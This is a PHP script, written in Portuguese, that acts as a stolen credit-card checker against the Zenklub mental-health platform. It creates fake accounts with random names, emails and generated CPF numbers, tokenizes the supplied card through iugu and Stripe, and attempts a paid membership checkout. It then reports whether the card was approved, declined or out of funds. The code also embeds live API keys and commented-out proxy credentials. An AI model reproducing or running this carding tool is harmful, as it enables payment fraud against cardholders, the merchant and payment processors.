<?php
    error_reporting(0);
    set_time_limit(0);
    include "emails.php";
    if($_REQUEST['debug']){
        error_reporting(20);
        ini_set('display_errors', 'on');
    }
   $nome = stringGen(rand(4, 9), false);


    $sobreNome = stringGen(rand(4, 8), false);
    
    function getStr($string, $start, $end){
      $str = explode($start, $string);
      $str = explode($end, $str[1]);
      return $str[0];
    }
$rnd = rand(1,1298);
$email = $emails[$rnd];
$email = "$email@gmail.com";
      $ch = curl_init();
      curl_setopt($ch, CURLOPT_URL, "https://api.zenklub.com.br/accounts/signup");
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
      curl_setopt($ch, CURLOPT_POST, true);
      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
      curl_setopt($ch, CURLOPT_POSTFIELDS, '{"country":"br","source":"mobile","timezone":"America/Sao_Paulo","name":"'.$nome.'","email":"'.$email.'","password":"102030","referralCode":null,"acceptTerms":true}');
      curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Host: api.zenklub.com.br',
'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
'accept-language: pt-BR',
'sec-ch-ua-mobile: ?1',
'authorization: unknown',
'content-type: application/json',
'accept: application/json, text/plain, */*',
'user-agent: Mozilla/5.0 (Linux; Android 10; Redmi Note 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36',
'origin: https://zenklub.com.br',
'referer: https://zenklub.com.br/'
        ));
      
      $fim = curl_exec($ch);
        
      if(strpos($fim, 'displayName')){

      }elseif(strpos($fim, 'Alrea')){
      }else{
        header("Refresh:1");
      }

    $loadtime = time();
    function getStrc($separa, $inicia, $fim, $contador){
      $nada = explode($inicia, $separa);
      $nada = explode($fim, $nada[$contador]);
      return $nada[0];
    }

    function multiexplode($delimiters, $string) {
        $ready = str_replace($delimiters, $delimiters[0], $string);
        $launch = explode($delimiters[0], $ready);
        return $launch;
    }
    
    function stringGen($tamanho, $numeros){
      $base = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
      if($numeros == true){
          $base .= '0123456899876543210';
      }
      $resultado = '';
      for($contador = 0; $tamanho > $contador; $contador++){
          $resultado .= $base[rand(0, strlen($base))];
      }
      return $resultado;
    }


    $Key = $_GET['pesquisar'];
    $lista = $_GET['lista'];
    $explode = multiexplode(array(";", "»", "|", ":", " ", "/"), $lista);
    
    $explode = array_values(array_filter($explode));
    @$cc = trim($explode[0]);
    @$mes = trim($explode[1]);
    @$ano = trim($explode[2]);
    @$cvv = trim($explode[3]);


    // if($Key !== ('78ae9beda603030bc7ae052790046c30d4a9ba71') ) {	exit("<span class='badge badge-danger'>[ #Reprovada ]</span> $cc|$mes|$ano|$cvv | <span class='badge badge-danger'> [KEY ACESSO INVÁLIDA]</span><br>");}

    if (!is_numeric($cc) || !is_numeric($mes) || !is_numeric($ano) || !is_numeric($cvv)) { exit("[DADOS INVÁLIDOS]");}
      
    sleep(5);
    $re = array(
      "visa" => "/^4[0-9]{12}(?:[0-9]{3})?$/",
      "mastercard" => "/^5[1-5][0-9]{14}$/",
      "amex" => "/^3[47][0-9]{13}$/",
      "diners" => "/^3(?:0[0-5]|[68][0-9])[0-9]{11}$/",
      "elo" => "/^((((636368)|(438935)|(504175)|(451416)|(636297))\d{0,10})|((5067)|(4576)|(4011))\d{0,12})$/",
      "hipercard" => "/^(606282\d{10}(\d{3})?)|(3841\d{15})$/",
      "discover" => "/^6(?:011|5[0-9]{2})[0-9]{12}$/",
      "aura" => "/^50[0-9]{17}$/"
  );

  if (preg_match($re['visa'], $cc)) {
      $type = "Visa";
  } else if (preg_match($re['mastercard'], $cc)) {
      $type = "Mastercard";
  } else if (preg_match($re['diners'], $cc)) {
      $type = "Diners";
  } else if (preg_match($re['discover'], $cc)) {
      $type = "Discover";
  } else if (preg_match($re['aura'], $cc)) {
      $type = "14";
  } else if (preg_match($re['hipercard'], $cc)) {
      $type = "Hipercard";
  } else if (preg_match($re['elo'], $cc)) {
      $type = "Elo";
  } else if (preg_match($re['amex'], $cc)) {
      $type = "Amex";
  } else {
      $type = "invalida";
  }


  ////////////////////////////////////////
 // Subtituir cc

  $camp1 = substr($cc, 0,4);
  $camp2 = substr($cc, 4,4);
  $camp3 = substr($cc, 8, 4);
  $camp4 = substr($cc, 12, 4);

/////////////////////////////////////

  // Subtituir Mês de MM para M
  // if (strlen($mes == '01') || strlen($mes == '02')  || strlen($mes == '03') || strlen($mes == '04') || strlen($mes == '05') && strlen($mes !== '10') !== false) {

  //     $mes = str_replace('0', '', $mes);
  //   }

    // Subtituir Mês de M para MM
    if(strlen($mes) == 1){
      $mes = "0".$mes;
    }

    //ANO EM AAAA
    // if(strlen($ano) == 2){
    //   $ano = "20".$ano;
    // }

    //  //ANO EM AA
    if(strlen($ano) > 2){
        $ano = substr($ano, 2,2);
    }


    $random = substr(str_shuffle(str_repeat("0123456789abcdefghijklmnopqrstuvwxyz", 3)), 0, 3);

    $n1 = 0;
    $n2 = round(rand(0, 9));
    $n3 = round(rand(0, 9));
    $n4 = round(rand(0, 9));
    $n5 = round(rand(0, 9));
    $n6 = round(rand(0, 9));
    $n7 = round(rand(0, 9));
    $n8 = round(rand(0, 9));
    $n9 = round(rand(0, 9));
    $d1 = $n9*2+$n8*3+$n7*4+$n6*5+$n5*6+$n4*7+$n3*8+$n2*9+$n1*10;
    $d1 = 11-(round($d1-(floor($d1/11)*11)));
    if($d1>=10) {
        $d1 = 0;
    }
    $d2 = $d1*2+$n9*3+$n8*4+$n7*5+$n6*6+$n5*7+$n4*8+$n3*9+$n2*10+$n1*11;
    $d2 = 11-(round($d2-(floor($d2/11)*11)));
    if($d2>=10) {
        $d2 = 0;
    }
    // $cpf = $n1.$n2.$n3.'.'.$n4.$n5.$n6.'.'.$n7.$n8.$n9.'-'.$d1.$d2;
    $cpf = $n1.$n2.$n3.$n4.$n5.$n6.$n7.$n8.$n9.$d1.$d2;

    $dominios = ['@gmail.com', '@yahoo.com', '@bol.com.br', '@uol.com.br'];
    $subEmail = stringGen(rand(rand(0, 7), rand(10, 14)), false);

    while (strlen($subEmail) < 8) {
        $subEmail = stringGen(rand(rand(0, 7), rand(10, 14)), false);
    }

   $emai = $subEmail.$dominios[rand(0, count($dominios)-1)];


    




/////////////////////////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.iugu.com/v1/payment_token?method=credit_card&data[number]=".$cc."&data[verification_value]=".$cvv."&data[first_name]=".$nome."&data[last_name]=".$sobreNome."&data[month]=".$mes."&data[year]=20".$ano."&data[brand]=".strtolower($type)."&data[fingerprint]=4fa07d88-8108-88cb-f6f2-41c9f973bed7&account_id=5D22E7FBC3BF462AB75C7E1C7EEA8798&callback=callback1587159384887");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$app4 = curl_exec($ch);

if(strpos($app4, 'está inválido')){ exit("(INVÁLIDO) (VERIFIQUE OS DADOS DO CARTÃO)");}
//////////////////////////////////////////////////////////////////////////////////////////////////////////



$curl = curl_init();

curl_setopt_array($curl, [
  CURLOPT_URL => "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyBmvSYlFxiQYhaxpUeresGeaSdkjP1w-gs",
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => "",
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => "POST",
  CURLOPT_POSTFIELDS => "{\"email\":\"$email\",\"password\":\"102030\",\"returnSecureToken\":true}",
  CURLOPT_HTTPHEADER => [
    "Host: www.googleapis.com",
    "accept: */*",
    "accept-language: pt-BR,pt;q=0.9",
    "content-type: application/json",
    "origin: https://zenklub.com.br",
    "referer: https://zenklub.com.br/",
    "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36",
    "x-client-version: Chrome/JsCore/8.6.1/FirebaseCore-web"
  ],
]);

$auth = curl_exec($curl);

$arr = json_decode($auth, true);

$idToken = $arr["idToken"];

$bin = substr($cc, 0, 6);
$file = 'bins.csv';
$searchfor = $bin;
$contents = file_get_contents($file);
$pattern = preg_quote($searchfor, '/');
$pattern = "/^.*$pattern.*\$/m";
if (preg_match_all($pattern, $contents, $matches)) {
    $encontrada = implode("\n", $matches[0]);
}
$pieces = explode(";", $encontrada);
$c = count($pieces);
if ($c == 8) {
    $pais = $pieces[4];
    $paiscode = $pieces[5];
    $banco = $pieces[2];
    $level = $pieces[3];
    $bandeira = $pieces[1];
} else {
    $pais = $pieces[5];
    $paiscode = $pieces[6];
    $level = $pieces[4];
    $banco = $pieces[2];
    $bandeira = $pieces[1];
}

$curl = curl_init();

curl_setopt_array($curl, [
  CURLOPT_URL => "https://services.zenklub.com.br/checkout/cart",
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => "",
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => "PUT",
  CURLOPT_POSTFIELDS => "{\"planId\":\"br_membership_monthly\",\"source\":\"web\"}",
  CURLOPT_HTTPHEADER => [
    "Host: services.zenklub.com.br",
    "accept: application/json, text/plain, */*",
    "authorization: Bearer $idToken",
    "content-type: application/json",
    "origin: https://zenklub.com.br",
    "referer: https://zenklub.com.br/",
    "sec-fetch-dest: empty",
    "sec-fetch-mode: cors",
    "sec-fetch-site: same-site",
    "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
  ],
]);

$resId = curl_exec($curl);


$arr = json_decode($resId, true);

$id = $arr["id"];
$profileId = $arr["profileId"];
$createdAt = $arr["createdAt"];
$profileToken = $arr["summary"]["token"];
// echo "<br>".$id;
// echo "<br>".$profileId;
// echo "<br>".$createdAt;
// echo "<br>".$profileToken;
// exit();

$curl = curl_init();

curl_setopt_array($curl, [
  CURLOPT_URL => "https://api.stripe.com/v1/tokens",
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => "",
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => "POST",
  CURLOPT_POSTFIELDS => "card[name]=$nome+F+$sobreNome&card[number]=$cc&card[cvc]=$cvv&card[exp_month]=$mes&card[exp_year]=$ano&guid=e1533e51-e0c2-44c1-9e4d-cf73e9cf085b116446&muid=d2784ba6-f966-4397-9cbf-566e49a0e160944f90&sid=9f2a1d44-6c9d-41fd-8710-e1f61b4e9a9ae0f9fc&payment_user_agent=stripe.js%2F49fd2ceab%3B+stripe-js-v3%2F49fd2ceab&time_on_page=612203&key=pk_live_b0WVu5n9d7tChtqI5Zjna4Ca&_stripe_version=2020-08-27&pasted_fields=number",
  CURLOPT_HTTPHEADER => [
    "Accept: application/json",
    "Accept-Language: pt-BR,pt;q=0.9",
    "Host: api.stripe.com",
    "Origin: https://js.stripe.com",
    "Referer: https://js.stripe.com/",
    "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Mobile/15E148 Safari/604.1"
  ],
]);

$app = curl_exec($curl);

$arr = json_decode($app, true);

$tokenid = $arr["id"];
$last4 = $arr["card"]["last4"];
$exp_month = $arr["card"]["exp_month"];
$funding = $arr["card"]["funding"];
$brand = $arr["card"]["brand"];
$livemode = $arr["livemode"];

if(strpos($livemode, 'false')!== false)  exit("$result)");

// echo "<br>".$tokenid;
// echo "<br>".$last4;
// echo "<br>".$exp_month;
// echo "<br>".$funding;
// echo "<br>".$brand;
// exit();

  
$curl = curl_init();

curl_setopt_array($curl, [
  CURLOPT_URL => "https://services.zenklub.com.br/checkout/cart/$id",
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => "",
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => "POST",
  CURLOPT_POSTFIELDS => "{\"country\":\"br\",\"currency\":\"brl\",\"items\":{\"plan\":{\"id\":\"br_membership_monthly\",\"name\":\"Membro Zenklub Mensal\",\"definition\":{\"color\":\"#18D1D3\",\"perks\":\" * Acesso a todos os testes e exercÃ­cios * HistÃ³rico ilimitado Ã s suas marcaÃ§Ãµes de humor diÃ¡rias * Acesso completo Ã  biblioteca de conteÃºdo zenklub * Descontos especiais em todos os parceiros zenklub\",\"description\":\"* Acesso completo Ã  biblioteca de conteÃºdos Zenklub\\n* HistÃ³rico ilimitado Ã s suas marcaÃ§Ãµes de humor diÃ¡rias\\n* FÃ¡cil acesso a toda comunidade de psicÃ³logos, psicanalistas, terapeutas e coaches\\n* Atendimento prioritÃ¡rio pela nossa equipe de suporte\"},\"credits\":null,\"creditsLifetimeDays\":null,\"imageUrl\":null,\"price\":14.9,\"period\":{\"value\":1,\"period\":\"month\"}}},\"suggestedContent\":null,\"vouchers\":{\"data\":[],\"visible\":false},\"products\":{\"data\":[],\"visible\":false},\"paymentMethods\":[{\"id\":\"card\",\"type\":\"card\",\"cards\":[{\"id\":\"$tokenid\",\"last4\":\"$last4\",\"name\":\"$nome F CARLOS\",\"expMonth\":$exp_month,\"expYear\":20$ano,\"brand\":\"$brand\",\"isNew\":true,\"save\":false,\"selected\":true}],\"title\":\"CartÃ£o de CrÃ©dito / DÃ©bito\",\"orderBy\":1,\"visible\":true,\"selected\":true},{\"id\":\"boleto\",\"type\":\"boleto\",\"title\":\"Boleto\",\"orderBy\":4,\"visible\":false,\"selected\":false,\"userdata\":{\"city\":\"\",\"name\":\"Fabiano Ramos Oliveira\",\"email\":\"deddede43@gmail.com\",\"state\":\"\",\"tax_id\":\"\",\"address\":\"\",\"postal_code\":\"\"}}],\"summary\":{\"token\":\"$profileToken\",\"discounts\":[],\"totalCost\":{\"label\":\"Total\",\"value\":14.9,\"orderBy\":2,\"decorator\":\"bold\"},\"totalClientCharge\":{\"label\":\"Total a pagar via CartÃ£o de CrÃ©dito / DÃ©bito\",\"value\":14.9,\"orderBy\":1,\"decorator\":\"bold\"}},\"profileId\":\"$profileId\",\"source\":\"web\",\"finalized\":false,\"createdAt\":\"$createdAt\",\"id\":$id,\"blocked\":false,\"billingData\":{\"pendencies\":[\"fiscalId\",\"postalCode\",\"city\",\"state\",\"neighborhood\",\"address\",\"addressNumber\",\"foreign\"]}}",
  CURLOPT_HTTPHEADER => [
    "Host: services.zenklub.com.br",
    "accept: application/json, text/plain, */*",
    "accept-language: pt-BR",
    "authorization: Bearer $idToken",
    "content-type: application/json",
    "origin: https://zenklub.com.br",
    "referer: https://zenklub.com.br/",
    "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
  ],
]);

$app4 = curl_exec($curl);

$arr = json_decode($app4, true);

$result = $arr["messageI18n"];

// echo $app4;
// exit();
//curl_setopt($ch, CURLOPT_PROXY, "proxy.apify.com:8000"); 
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "auto:qDtCEMYhmhCng6SEL8rmAWaYz");

//////////////////////////////////////////////////////////////////////////////////
$binn = substr($cc, 0,6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://bin-checker.net/api/'.$binn);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bin = curl_exec($ch);

date_default_timezone_set('America/Sao_Paulo');
$data = date("d/m/Y H:i");

$arr = json_decode($bin, true);

$brand =  $arr["scheme"];
$tipo =  $arr["type"];
$nivel =  $arr["level"];
$pais =  $arr["country"]["code"];


$banco =  $arr["bank"]["name"];

if ($banco) {
$banco2 =  $arr["bank"]["name"];
} else {
$banco2 = "N/A";
}
///////////////////////////////////////////////////////////////////////////////
if(strpos($app4, 'paymentMethods":[{"id":"card"')!== false){
  echo ("(AUTH) @Zoom171");

}else if(strpos($app4, 'Limite excedido\/sem saldo.')!== false){
  echo (" (51) SEM SALDO @Zoom171");

}else if(strpos($app4, 'Viola\u00e7\u00e3o de seguran\u00e7a.')!== false){
  echo (" (63) VIOLAÇÃO DE SEGURANÇA @Zoom171");

}else{
  exit(" $result ");
}